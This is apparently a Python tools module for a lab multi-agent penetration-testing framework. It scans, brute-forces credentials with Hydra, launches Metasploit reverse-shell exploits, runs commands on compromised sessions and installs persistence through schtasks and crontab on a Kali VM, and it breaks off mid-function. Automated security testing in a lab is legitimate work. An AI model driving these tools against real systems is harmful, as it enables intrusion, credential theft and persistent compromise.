import subprocess
import json
import nmap 
import os 
import time 
import paramiko 
import requests 
from crewai.tools import tool
from datetime import datetime 
from jinja2 import Environment, FileSystemLoader, TemplateNotFound
from cvss import CVSS3 
import networkx as nx
import re 

from database import insert_finding, update_exploit_score, get_all_findings, get_exploit_scores

_ssh_client = None 

def _get_ssh_client():
    global _ssh_client
    if _ssh_client is None:
        kali_ip = os.getenv("KALI_IP")
        kali_user = os.getenv("KALI_USERNAME")
        kali_pass = os.getenv("KALI_PASSWORD")

        if not all([kali_ip, kali_user, kali_pass]):
            raise ValueError("KALI_IP, KALI_USERNAME, KALI_PASSWORD must be set in .env for SSH tools.")
        _ssh_client = paramiko.SSHClient()
        _ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        _ssh_client.connect(hostname=kali_ip, username=kali_user, password=kali_pass, timeout=10)
    return _ssh_client

def _execute_remote_command(command: str, agent_name: str, task_name: str, tool_name: str, timeout: int = 300) -> str: 
    """Executes a command on the Kali VM via SSH and captures output."""
    try:
        ssh_client = _get_ssh_client()
        stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()

        if error and not output.strip():
            insert_finding(agent_name, task_name, f"{tool_name}_error", {"command": command, "error": error})
            return f"Error executing remote command: {error}"
        insert_finding(agent_name, task_name, f"{tool_name}_output", {"command": command, "output": output, "stderr": error})
        return output
    except paramiko.AuthenticationException:
        insert_finding(agent_name, task_name, f"{tool_name}_error", {"command": command, "error": "SSH Authentication failed."})
        return "SSH Authentication failed. Check Kali VM credetials in .env"
    except paramiko.SSHException as e:
        insert_finding(agent_name, task_name, f"{tool_name}_error", {"command": command, "error": f"SSH connection error: {e}"})
        return f"SSH connection error: {e}"
    except Exception as e:
        insert_finding(agent_name, task_name, f"{tool_name}_error", {"command": command, "error": f"Unexpected error: {e}"})
        return f"Unexpected error executing remote command: {e}"
    

@tool
def gemini_consultation(query: str, context: str = "", agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Consults Google Gemini AI for strategic advice on penetration testing techniques.
    """
    time.sleep(3)
    
    try:
        import google.generativeai as genai
        import os
        
        api_key = os.getenv('GEMINI_API_KEY')
        if not api_key:
            return "Google API key not configured. Please check your .env file."
        
        # Configure the Gemini API
        genai.configure(api_key=api_key)
        
        # Create the model
        model = genai.GenerativeModel('gemini-2.5-flash')
        
        # Prepare the prompt with explicit instruction for English response
        prompt = f"You are a penetration testing expert. Always respond in English. {query}. Context: {context}"
        
        # Generate content
        response = model.generate_content(prompt)
        
        # Extract the response text
        ai_response = response.text
        
        insert_finding(agent_name, task_name, "ai_consultation", {
            "query": query, 
            "context": context, 
            "response": ai_response
        })
        
        return ai_response
        
    except Exception as e:
        error_msg = f"Error consulting Gemini: {e}"
        insert_finding(agent_name, task_name, "ai_consultation_error", {
            "query": query, 
            "error": str(e)
        })
        return error_msg
    
@tool
def nmap_scan(target_ip: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Performs a comprehensive Nmap scan on the target IP address via Kali VM.
    Scans common ports, detects services, and identifies OS.

    Args:
        target_ip: The IPv4 or IPv6 address to scan.
       
    Returns:
        A textual summary of open ports, services, and versions discovered on the target.

    """
    time.sleep(20)
    command = f"nmap -n -sS -sV -O -p 1-1000 -T4 -A --host-timeout 10m {target_ip} -oX -"
    try:
        xml_output = _execute_remote_command(command, agent_name, task_name, "nmap_scan_tool", timeout=600)
        
        if not xml_output or not xml_output.lstrip().startswith("<"):
            insert_finding(agent_name, task_name, "nmap_scan_parse_warning", {"snippet": xml_output[:300]})
            return f"Nmap did not return XML (snippet): {xml_output[:200]}"
        
        # Use python-nmap to parse the XML output
        nm = nmap.PortScanner()
        nm.analyse_nmap_xml_scan(xml_output) # Parse from XML string

        scan_results_parsed = []
        for host in nm.all_hosts():
            host_data = {
                "host": host,
                "hostname": nm[host].hostname(),
                "state": nm[host].state(),
                "os": [],
                "ports": []
            }
            if 'osmatch' in nm[host]:
                for osmatch in nm[host]['osmatch']:
                    host_data["os"].append({"name": osmatch['name'], "accuracy": osmatch['accuracy']})
            if 'tcp' in nm[host]:
                for port in nm[host]['tcp']:
                    port_info = nm[host]['tcp'][port]
                    host_data["ports"].append({
                        "port": port,
                        "state": port_info['state'],
                        "service": port_info['name'],
                        "version": port_info.get('version', 'N/A')
                    })
            scan_results_parsed.append(host_data)
        
        insert_finding(agent_name, task_name, "nmap_scan_result", scan_results_parsed)

        summary_lines = []
        for host_data in scan_results_parsed:
            summary_lines.append(f"Host: {host_data['host']} ({host_data['hostname']}) - State: {host_data['state']}")
            if host_data['os']:
                summary_lines.append(f"  OS: {host_data['os'][0]['name']} (Accuracy: {host_data['os'][0]['accuracy']}%)")
            for port_info in host_data['ports']:
                summary_lines.append(f"  Port: {port_info['port']}/{port_info['state']} - Service: {port_info['service']} (Version: {port_info['version']})")
        return "\n".join(summary_lines)

    except Exception as e:
        return f"Error during Nmap scan or parsing: {e}"
    
@tool
def vulnerability_scan(target: str, scan_type: str = "web", agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """Performs vulnerability scanning using various tools."""
    time.sleep(20)
    
    try:
        if scan_type == "web":
            command = f"nikto -h {target} -C all"
        elif scan_type == "network":
            command = f"nmap -sV --script vuln {target}"
        else:
            return f"Unknown scan type: {scan_type}"
        
        output = _execute_remote_command(command, agent_name, task_name, "vulnerability_scan", timeout=600)
        
        # Parse and structure results
        vulnerabilities = []
        lines = output.split('\n')
        for line in lines:
            if '+ ' in line and any(keyword in line.lower() for keyword in ['vulnerable', 'risk', 'cve', 'xss', 'sql']):
                vulnerabilities.append(line.strip())
        
        result_data = {
            "target": target,
            "scan_type": scan_type,
            "vulnerabilities": vulnerabilities,
            "raw_output": output[:1000] + "..." if len(output) > 1000 else output
        }
        
        insert_finding(agent_name, task_name, "vulnerability_scan_result", result_data)
        
        if vulnerabilities:
            return f"Vulnerability scan found {len(vulnerabilities)} issues:\n" + "\n".join(vulnerabilities[:10])
        else:
            return "No significant vulnerabilities found."
            
    except Exception as e:
        return f"Error during vulnerability scan: {e}"
    

@tool
def gobuster_scan(target_url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", 
                 agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """Performs directory brute-forcing using Gobuster."""
    time.sleep(20)
    
    try:
        command = f"gobuster dir -u {target_url} -w {wordlist} -x php,txt,html -t 50"
        output = _execute_remote_command(command, agent_name, task_name, "gobuster_scan", timeout=600)
        
        # Parse results
        directories = []
        lines = output.split('\n')
        for line in lines:
            if "(Status:" in line and "Size:" in line:
                directories.append(line.strip())
        
        result_data = {
            "target": target_url,
            "wordlist": wordlist,
            "directories": directories,
            "raw_output": output[:1000] + "..." if len(output) > 1000 else output
        }
        
        insert_finding(agent_name, task_name, "gobuster_scan_result", result_data)
        
        if directories:
            return f"Gobuster found {len(directories)} directories:\n" + "\n".join(directories[:10])
        else:
            return "No directories found or scan failed."
            
    except Exception as e:
        return f"Error during Gobuster scan: {e}"


@tool
def dirb_scan(target_url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", 
              agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """Performs directory brute-forcing using Dirb."""
    time.sleep(20)
    
    try:
        command = f"dirb {target_url} {wordlist} -r -S -o /tmp/dirb_output.txt"
        output = _execute_remote_command(command, agent_name, task_name, "dirb_scan", timeout=600)
        
        # Read the output file
        output_content = _execute_remote_command("cat /tmp/dirb_output.txt", agent_name, task_name, "dirb_read_output", timeout=30)
        
        # Parse results
        directories = []
        lines = output_content.split('\n')
        for line in lines:
            if "+ " in line and "DIRECTORY" in line:
                directories.append(line.strip())
        
        result_data = {
            "target": target_url,
            "wordlist": wordlist,
            "directories": directories,
            "raw_output": output_content[:1000] + "..." if len(output_content) > 1000 else output_content
        }
        
        insert_finding(agent_name, task_name, "dirb_scan_result", result_data)
        
        if directories:
            return f"Dirb found {len(directories)} directories:\n" + "\n".join(directories[:10])
        else:
            return "No directories found or scan failed."
            
    except Exception as e:
        return f"Error during Dirb scan: {e}"

@tool
def hydra_brute_force(target_ip: str, service: str, username: str = "", 
                     userlist: str = "/usr/share/wordlists/nmap.lst", 
                     passwordlist: str = "/usr/share/wordlists/rockyou.txt",
                     agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """Performs brute force attacks using Hydra."""
    time.sleep(25)
    
    try:
        # Consult AI for strategy
        advice = gemini_consultation(f"brute force attack on {service}", f"Target: {target_ip}")
        
        # Service-specific parameters
        service_ports = {
            "ssh": 22,
            "ftp": 21,
            "http": 80,
            "https": 443,
            "postgresql": 5432,
            "mysql": 3306
        }
        
        port = service_ports.get(service.lower(), 0)
        if port == 0:
            return f"Unsupported service for brute force: {service}"
        
        if username:
            command = f"hydra -l {username} -P {passwordlist} -s {port} {target_ip} {service} -t 4 -vV"
        else:
            command = f"hydra -L {userlist} -P {passwordlist} -s {port} {target_ip} {service} -t 4 -vV"
        
        output = _execute_remote_command(command, agent_name, task_name, "hydra_brute_force", timeout=600)
        
        # Check for successful credentials
        success = False
        credentials = []
        lines = output.split('\n')
        for line in lines:
            if "[ERROR]" in line or "finished" in line.lower():
                if "0 valid passwords found" not in line.lower():
                    success = True
                    # Extract credentials from successful line
                    if "login:" in line.lower() and "password:" in line.lower():
                        credentials.append(line.strip())
        
        result_data = {
            "target": target_ip,
            "service": service,
            "success": success,
            "credentials": credentials,
            "advice": advice,
            "raw_output": output[:1000] + "..." if len(output) > 1000 else output
        }
        
        insert_finding(agent_name, task_name, "brute_force_result", result_data)
        
        if success and credentials:
            return f"Brute force successful! Credentials found:\n" + "\n".join(credentials)
        elif success:
            return f"Brute force completed but no clear credentials extracted. Raw output: {output[:500]}"
        else:
            return f"Brute force failed. Advice: {advice}"
            
    except Exception as e:
        return f"Error during brute force attack: {e}"
    

@tool
def metasploit_exploit(
    target_ip: str,
    exploit_module: str,
    payload: str = "windows/meterpreter/reverse_tcp",
    lhost: str = os.getenv("KALI_IP", "192.168.56.10"),
    lport: int = 4444,
    agent_name: str ="Unknown",
    task_name: str ="Unknown"
) -> str:
    """
    Attempts to exploit a target using a specified Metasploit module and payload via msfconsole on Kali.
    This toll directly executes msfconsole commands on the Kali VM.
    
    Args:
        target_ip: The IP address of the target system.
        exploit_module: The Metasploit module path to use.
       
    Returns:
        Output from Metasploit indicating success or failure of the exploit attempt.
    """
    time.sleep(20)

    msf_commands = [
        f"use exploit/{exploit_module}",
        f"set RHOSTS {target_ip}",
        f"set LHOST {lhost}",
        f"set PAYLOAD {payload}",
        "exploit -j -z",
        "sleep 10",
        "sessions -l",
        "exit"
    ]

    full_command = "msfconsole -q -x \"" + ";".join(msf_commands) + "\""

    try:
        output = _execute_remote_command(full_command, agent_name, task_name, "metaspoit_exploit_tool", timeout=120)

        if "Meterpreter session" in output or "Session [1]" in output or "Session opened" in output:
            session_id_match = re.search(r"Session (\d+) opened", output)
            session_id = session_id_match.group(1) if session_id_match else "N/A"
            insert_finding(agent_name, task_name, "exploit_success", {"exploit": exploit_module, "target": target_ip, "sessiom_id": session_id, "output_snippet": output[:500]})
            update_exploit_score(exploit_module, True)
            return f"Exploit successful! Session ID: {session_id}. Output snippet:\n{output[:1000]}..."
        else:
            insert_finding(agent_name, task_name, "exploit_failure",{"exploit": exploit_module, "target": target_ip, "reason": "No session established", "output_snippet": output[:500]})
            update_exploit_score(exploit_module, False)
            return f"Exploit executed, but no session established. Output snippet:\n{output[:1000]}..."
        
    except Exception as e:
        insert_finding(agent_name, task_name, "exploit_error", {"exploit": exploit_module, "target": target_ip, "error": str(e)})
        update_exploit_score(exploit_module, False)
        return f"An unexpected error occured during Metasploit exploit: {e}"

@tool
def web_vulnerability_scan(target_url: str, username: str = None, password: str = None, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Performs a web vulnerability scan using Nikto via Kali VM.
    Supports HTTP Basic Authentication by passing username and password.

    Args:
        target_url: The HTTP/HTTPS URL of the web application.
        username: The username for HTTP Basic Authentication. (Optional)
        password: The password for HTTP Basic Authentication. (Optional)
       
    Returns:
        A summary of vulnerabilities discovered.
    """
    time.sleep(20)

    # Build the Nikto command
    if username and password:
        # Format the URL to include credentials: http://username:password@hostname/
        from urllib.parse import urlparse, urlunparse
        parsed_url = urlparse(target_url)
        
        # Construct the netloc part with credentials: user:pass@hostname:port
        netloc = f"{username}:{password}@{parsed_url.hostname}"
        if parsed_url.port:
            netloc += f":{parsed_url.port}"
            
        # Rebuild the URL with the new netloc component
        auth_url = urlunparse((parsed_url.scheme, netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))
        command = f"nikto -h {auth_url} -id {username}:{password}" # -id flag provides credentials for authentication
    else:
        # If no credentials are provided, scan without them
        command = f"nikto -h {target_url}"

    try:
        # The rest of your existing function remains the same
        output = _execute_remote_command(command, agent_name, task_name, "web_scan_tool", timeout=600)
        output_lines = output.splitlines()
        vulnerabilities = [line for line in output_lines if "+ " in line or "Vulnerability" in line or "OSVDB" in line]

        parsed_findings = {"target_url": target_url, "vulnerabilities": vulnerabilities}
        insert_finding(agent_name, task_name, "web_scan_result", parsed_findings)

        if vulnerabilities:
            return "Nikto Scan Results:\n" + "\n".join(vulnerabilities[:10]) +("\n..." if len(vulnerabilities) > 10 else "")
        else:
            return "Nikto scan completed. No significant vulnerabilities found or output not parsed."
        
    except Exception as e:
        return f"Error during web scan: {e}"
    
@tool
def dvwa_authenticated_scan(target_url: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Performs an authenticated Nikto scan on a DVWA target by first logging in and capturing the session cookie.
    This is necessary because DVWA uses form-based login, not Basic Auth.

    Args:
        target_url: The base URL of the DVWA application (e.g., http://192.168.56.30/dvwa).
       
    Returns:
        A summary of vulnerabilities discovered.
    """
    time.sleep(20)
    
    # 1. Use curl to login to DVWA and capture the session cookie
    login_url = f"{target_url}/login.php"
    # DVWA login POST parameters
    login_data = "username=admin&password=password&Login=Login"
    
    # This curl command:
    # - (-c) saves the cookies received to a file
    # - (-d) posts the login data
    # - (-H) sets the correct content type for the form
    get_cookie_command = f"curl -s -c /tmp/dvwa_cookie.txt -d '{login_data}' -H 'Content-Type: application/x-www-form-urlencoded' '{login_url}' > /dev/null"
    
    # Execute the login (we don't care about the HTML output, just the cookie file)
    _ = _execute_remote_command(get_cookie_command, agent_name, task_name, "dvwa_login", timeout=60)
    
    # 2. Construct the Nikto command to use the saved cookie
    nikto_command = f"nikto -h {target_url} -Cookies /tmp/dvwa_cookie.txt"

    try:
        # 3. Run Nikto with the authenticated session
        output = _execute_remote_command(nikto_command, agent_name, task_name, "dvwa_authenticated_scan", timeout=600)
        
        output_lines = output.splitlines()
        vulnerabilities = [line for line in output_lines if "+ " in line or "Vulnerability" in line or "OSVDB" in line]

        parsed_findings = {"target_url": target_url, "vulnerabilities": vulnerabilities, "scan_type": "authenticated"}
        insert_finding(agent_name, task_name, "web_scan_result", parsed_findings)

        if vulnerabilities:
            return "Authenticated Nikto Scan Results:\n" + "\n".join(vulnerabilities[:10]) + ("\n..." if len(vulnerabilities) > 10 else "")
        else:
            return "Authenticated Nikto scan completed. No significant vulnerabilities found."
        
    except Exception as e:
        return f"Error during authenticated DVWA scan: {e}"
    
@tool
def cve_lookup(query: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Looks up Common Vulnerabilities and Exposures (CVEs) based on a keyword query
    (e.g., software name, version, or CVE ID).
    Uses a public API (NVD) to retrieve relevant CVEs.
   
    Args:
        cve_id: The CVE identifier (e.g., 'CVE-2023-1234').
        
    Returns:
        Detailed CVE information including description, CVSS score, and references.
    """
    time.sleep(20)
    # NVD API endpoint (no API key needed for basic search, but rate limited)
    api_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={query}&resultsPerPage=5"
    
    try:
        response = requests.get(api_url, timeout=15)
        response.raise_for_status() # Raise an exception for HTTP errors
        
        data = response.json()
        
        if data and 'vulnerabilities' in data:
            summary = []
            parsed_cves = []
            for vuln in data['vulnerabilities']:
                cve_id = vuln.get('cve', {}).get('id', 'N/A')
                description = vuln.get('cve', {}).get('descriptions', [{}])[0].get('value', 'No description.')
                
                
                cvss_v3_metrics = None
                for metric in vuln.get('cve', {}).get('metrics', {}).get('cvssMetricV31', []) + vuln.get('cve', {}).get('metrics', {}).get('cvssMetricV30', []):
                    if 'cvssData' in metric:
                        cvss_v3_metrics = metric['cvssData']
                        break
                
                cvss_vector = cvss_v3_metrics.get('vectorString', 'N/A') if cvss_v3_metrics else 'N/A'
                severity = cvss_v3_metrics.get('baseSeverity', 'N/A') if cvss_v3_metrics else 'N/A'

                summary.append(f"CVE-ID: {cve_id}\nSeverity: {severity}\nVector: {cvss_vector}\nDescription: {description[:200]}...") 
                parsed_cves.append({
                    "cve_id": cve_id,
                    "severity": severity,
                    "cvss_vector": cvss_vector,
                    "description": description
                })
            
            insert_finding(agent_name, task_name, "cve_lookup_result", {"query": query, "cves": parsed_cves})
            return "CVE Lookup Results:\n" + "\n".join(summary)
        else:
            insert_finding(agent_name, task_name, "cve_lookup_result", {"query": query, "cves": []})
            return "No relevant CVEs found for the query."

    except requests.exceptions.RequestException as e:
        insert_finding(agent_name, task_name, "cve_lookup_error", {"query": query, "error": str(e)})
        return f"Error connecting to CVE API: {e}"
    except json.JSONDecodeError:
        insert_finding(agent_name, task_name, "cve_lookup_error", {"query": query, "error": "Failed to parse CVE API response (invalid JSON)."})
        return "Failed to parse CVE API response (invalid JSON)."
    except Exception as e:
        insert_finding(agent_name, task_name, "cve_lookup_error", {"query": query, "error": str(e)})
        return f"An unexpected error occurred during CVE lookup: {e}"

@tool
def execute_custom_script(script_path: str, args: str = "", agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Executes a custom Python or shell script located an the Kali VM.
    Provide the full path to the script and any arguments.
    
    Args:
        script_path: The local filesystem path to the script.
       
    Returns:
        Standard output and error produced by the script.
    """
    time.sleep(20)
    command = f"python3 {script_path} {args}"

    try:
        output = _execute_remote_command(command, agent_name, task_name, "execute_custom_script_tool", timeout=120)
        insert_finding(agent_name, task_name, "custom_script_output", {"script_path": script_path, "args": args, "output": output})
        return output
    except Exception as e:
        return f"Error executing custom script: {e}"

@tool
def generate_markdown_report(report_content: str, filename: str = "penetration_test_report.md", agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Generates a markdown formatted report from provided content.
   
    Args:
        report_data: The content to include in the report.
        output_path: The file path where the Markdown report should be saved.
        
    Returns:
        Path to the generated Markdown report file.
    """
    time.sleep(20)
    try:
        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)
        full_path = os.path.join(report_dir, filename)

        with open(full_path, "w") as f:
            f.write(report_content)

        insert_finding(agent_name, task_name, "report_generation", {"filename": filename, "path": full_path})
        return f"Report successfully generated and saved to: {full_path}"
    except Exception as e:
        return f"Failed to generate markdown report: {e}"
    


from langchain_community.vectorstores import Chroma
from langchain_google_genai import GoogleGenerativeAIEmbeddings
import os

embeddings_model_name = os.getenv("MODEL_NAME", "models-embedding-001" )
embeddings = GoogleGenerativeAIEmbeddings(model=embeddings_model_name)

CHROMA_DB_PATH = "./chroma_db"
os.makedirs(CHROMA_DB_PATH, exist_ok=True)
vector_store = Chroma(persist_directory=CHROMA_DB_PATH, embedding_function=embeddings)

@tool
def add_to_long_term_memory(key: str, content: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Adds a piece of information to the agent's long-term memory (vector database).
    Use for important findings, successful strategies, or learned patterns.
    Key should be a unique identifier or a descriptive phrase.

    Args:
        key: Identifier for the stored data.
        value: Data to store.
       
    Returns:
        Confirmation message of successful storage.
    """
    time.sleep(20)
    try:
        vector_store.add_texts(texts=[content], metadatas=[{"key": key, "timestamp": datetime.now().isoformat(), "agent": agent_name, "task": task_name}])
        vector_store.persist()
        insert_finding(agent_name, task_name, "memory_add", {"key": key, "content_snippet": content[:100]})
        return f"Information '{key}' added to long-term memory."
    except Exception as e:
        return f"Failed to add to memory: {e}"
    

@tool
def retrieve_from_long_term_memory(query: str, k: int = 1, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Retrieves relevant information from the agent's long-term memory based on a query.
   
    Args:
        key: Identifier of the stored data to retrieve.
        
    Returns:
        The value associated with the given key, or an error message if not found.
    """
    time.sleep(20)
    try:
        docs = vector_store.similarity_search(query, k=k)
        retrieved_content = [doc.page_content for doc in docs]
        insert_finding(agent_name, task_name, "memory_retrieve", {"query": query, "retrieved_count": len(retrieved_content)})
        if retrieved_content:
            return f"Retrieved from memory: {json.dumps(retrieved_content, indent=2)}"
        else:
            return "No relevant information found in long-term memory."
    except Exception as e:
        return f"Failed to retrive from memroy: {e}"
    

@tool
def record_exploit_outcome(exploit_module: str, success: bool, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Records the outcome of an exploit to influence future decisions.

    Args:
        key: Identifier of the stored data to retrieve.
        
    Returns:
        The value associated with the given key, or an error message if not found.
    """
    time.sleep(20)
    update_exploit_score(exploit_module, success)
    insert_finding(agent_name, task_name, "exploit_outcome_recorded", {"module": exploit_module, "success": success})
    return f"Outcome for {exploit_module} recorded as {'success' if success else 'failure'}."


@tool
def get_exploit_scores_tool(module_name: str = None, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """Retrieves exploit scores, optionally for a specific module.
    
    Args:
        agent_name: Name of the agent requesting the scores.
        task_name: Name or description of the current task.

    Returns:
        A summary of exploit scores with related context.
    """
    time.sleep(20)
    scores = get_exploit_scores(module_name)
    insert_finding(agent_name, task_name, "exploit_scores_retrieved", {"query_module": module_name, "scores": scores})
    return json.dumps(scores, indent=2)    



TEMPLATE_DIR = os.path.abspath(os.getenv("TEMPLATE_DIR", "templates"))
os.makedirs(TEMPLATE_DIR, exist_ok=True)
env = Environment(loader=FileSystemLoader(TEMPLATE_DIR))

@tool
def generate_html_report(report_data_json: str,
                         filename: str = "penetration_test_report.html",
                         agent_name: str = "Unknown",
                         task_name: str = "Unknown") -> str:
    """Generate an HTML report from provided data and save to a file.
    
    Args:
        report_data: The HTML body or template data.
        output_path: File path where the HTML file should be saved.
       
    Returns:
        Path to the generated HTML report file.
    """

    try:
        data = json.loads(report_data_json) if isinstance(report_data_json, str) else report_data_json
        try:
            template = env.get_template("report_template.html")
        except TemplateNotFound:
            # write a minimal default so we never fail here
            default_path = os.path.join(TEMPLATE_DIR, "report_template.html")
            with open(default_path, "w", encoding="utf-8") as f:
                f.write("""<!doctype html><html><body>
<h1>Pentest Report</h1>
<pre>{{ report | tojson(indent=2) }}</pre>
</body></html>""")
            template = env.get_template("report_template.html")

        html = template.render(report=data)
        os.makedirs("reports", exist_ok=True)
        path = os.path.join("reports", filename)
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        insert_finding(agent_name, task_name, "html_report_generation", {"path": path})
        return f"HTML report saved: {path}"
    except Exception as e:
        insert_finding(agent_name, task_name, "html_report_generation_error", {"error": str(e)})
        return f"Failed to generate HTML report: {e}"

@tool
def calculate_cvss_score(cvss_vector_string: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Calculates the CVSS v3 score from a CVSS vector string (e.g., "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H),
    
     Args:
        cve_data: Vulnerability data in JSON or text format.
        
    Returns:
        The computed CVSS score and its severity rating.
    """
    time.sleep(20)

    try:
        c = CVSS3(cvss_vector_string)
        score_info = {"vector": cvss_vector_string, "base_score": c.base_score, "severity": c.severities()[0]}
        insert_finding(agent_name, task_name, "cvss_score_calculated", score_info)
        return f"CVSS Score: {c.base_score}, Severity: {c.severities()[0]}"
    except Exception as e:
        insert_finding(agent_name, task_name, "cvss_score_error", {"vector": cvss_vector_string, "error": str(e)})
        return f"Failed to calculate CVSS score: {e}. Ensure valid CVSS vector string."
    
from typing import Union
    

@tool
def visualize_attack_path(findings_json: Union[str,dict], filename: str = "attack_path.json", agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Accepts findings as JSON string OR dict and produces a node-link JSON file.
    Generates a network graph representation of the attack path from findings.
   
    Args:
        findings_json: Dictionary containing nodes, edges, and vulnerability details.
         
    Returns:
        Path or reference to the generated visualization file.
    """
    time.sleep(20)
    try:
        findings = findings_json if isinstance(findings_json, dict) else json.loads(findings_json)

        G = nx.DiGraph()
        G.add_node("Start", type="event", label="Start")

        # very forgiving parsing
        if isinstance(findings, dict):
            iterable = findings.get("findings") or findings.get("nodes") or [findings]
        else:
            iterable = findings

        # walk through entries
        for entry in iterable:
            if not isinstance(entry, dict):
                continue
            etype = entry.get("type", "")
            data  = entry.get("data", {})

            if etype == "nmap_scan_result" and isinstance(data, list):
                for host in data:
                    h = host.get("host", "unknown")
                    G.add_node(h, type="host", label=h)
                    if not G.has_edge("Start", h):
                        G.add_edge("Start", h, label="Scanned")

            if etype == "exploit_success" and isinstance(data, dict):
                target = data.get("target", "unknown")
                mod    = data.get("exploit", "exploit")
                sid    = str(data.get("session_id", "S"))
                session = f"Session_{sid}"
                G.add_node(session, type="session", label=session)
                G.add_edge(target, session, label=f"Exploited with {mod}")
                comp = f"Compromised_{target}"
                G.add_node(comp, type="compromise", label=comp)
                G.add_edge(session, comp, label="Access Gained")

        graph_data = nx.node_link_data(G)

        viz_dir = "visualizations"
        os.makedirs(viz_dir, exist_ok=True)
        path = os.path.join(viz_dir, filename)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(graph_data, f, indent=2)

        insert_finding(agent_name, task_name, "attack_path_visualization", {"path": path})
        return f"Attack path data saved: {path}"
    except Exception as e:
        insert_finding(agent_name, task_name, "attack_path_error", {"error": str(e)})
        return f"Failed to visualize attack path: {e}"
    

@tool
def meterpreter_command_tool(session_id: int, command: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Executes a Meterpreter command on an active session via Metasploit RPC.
    
    Args:
        session_id: The ID of the Meterpreter session.
        command: Command to execute in the session.
        
    Returns:
        Output from the executed command.
    """
    time.sleep(20)
    rpc_password = os.getenv("MSFRPCD_PASSWORD")
    kali_ip = os.getenv("KALI_IP")

    if not rpc_password or not kali_ip:
        return "MSFRPCD_PASSWORD or KALI_IP environment variables not set."
    
    try:
        msf_command = f"sessions -i {session_id} -c \"{command}\""
        full_command = f"msfconsole -q -x \"{msf_command}; exit\""

        output = _execute_remote_command(full_command, agent_name, task_name, "meterpreter_command_tool", timeout=60)

        insert_finding(agent_name, task_name, "meterpreter_command_output", {"session_id": session_id, "command": command, "output": output})
        return f"Meterpreter command '{command}' output:\n{output}"
    except Exception as e:
        insert_finding(agent_name, task_name, "meterpreter_command_error", {"session_id": session_id, "command": command, "error": str(e)})
        return f"An unexpected error occured during Meterpreter command: {e}"
    

@tool
def shell_command_tool(session_id: int, command: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Executes a shell command on an active session (non-Meterpreter) via Metasploit RPC.
    
    Args:
        command: Shell command string to execute.
       
    Returns:
        Output and/or error messages from the shell command.
    """
    time.sleep(20)
    rpc_password = os.getenv("MSFRPCD_PASSWORD")
    kali_ip = os.getenv("KALI_IP")

    if not rpc_password or not kali_ip:
        return "MSFRPCD_PASSWORD or KALI_IP environment variables not set."
    
    try:
        msf_command = f"sessions -i {session_id} -c \"shell {command}\""
        full_command = f"msfconsole -q -x \"{msf_command}; exit\""

        output = _execute_remote_command(full_command, agent_name, task_name, "shell_command_tool", timeout=60)
        insert_finding(agent_name, task_name, "shell_command_output", {"session_id": session_id, "command": command, "output": output})
        return f"Shell command '{command}' output:\n{output}"
    except Exception as e:
        insert_finding(agent_name, task_name, "shell_command_error", {"session_id": session_id, "command": command, "error": str(e)})
        return f"An unexpected error occured during shell command: {e}"
    

@tool
def add_scheduled_task_tool(session_id: int, command: str, schedule: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Attempts to add a scheduled task for persistence on a Windows compromised host.
    Requires an active Meterpreter session.

    Args:
        task_name_to_add: The name/command for the scheduled task.
        schedule: Cron-style or system scheduler timing expression.
        
    Returns:
        Confirmation message of successful scheduling.
    """
    time.sleep(20)
    
    full_command = f"execute -f schtasks -a \"/create /tn MyTask /tr \\\"cmd /c {command}\\\" /sc {schedule} /F\""
    return meterpreter_command_tool(session_id, full_command, agent_name, task_name)

@tool
def add_cron_job_tool(session_id: int, command: str, schedule: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Attempts to add a cron job for persistence on a Linux compromised host.
    Requires an active shell session.

    Args:
        cron_expression: Timing expression in cron syntax.
        command: Command to execute when triggered.
        
    Returns:
        Confirmation message of successful cron job creation.
    """
    time.sleep(10)
    full_command = f"echo \"{schedule} {command}\" | crontab -"
    return shell_command_tool(session_id, full_command, agent_name, task_name)


@tool
def ids_detection_tool(target_ip: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Simulates IDS/IPS detection by checking for common alerts related to target IP.
    In a real lab, this would query a SIEM or IDS log.
    
    Args:
        log_source: Path or identifier of the IDS log source.
       
    Returns:
        A summary of detected threats and anomalies.
    """
    time.sleep(20)
    
    if "192.168.56.20" in target_ip: 
        result = "Simulated IDS/IPS detected suspicious activity on target. Alert: 'Nmap scan detected from Kali-Attacker'."
    else:
        result = "Simulated IDS/IPS reports no suspicious activity for target."
    insert_finding(agent_name, task_name, "ids_detection_result", {"target": target_ip, "status": result})
    return result


@tool
def siem_integration_tool(finding_type: str, details_json: str, agent_name: str = "Unknown", task_name: str = "Unknown") -> str:
    """
    Simulates sending a structured security finding to a SIEM system.
    
    Args:
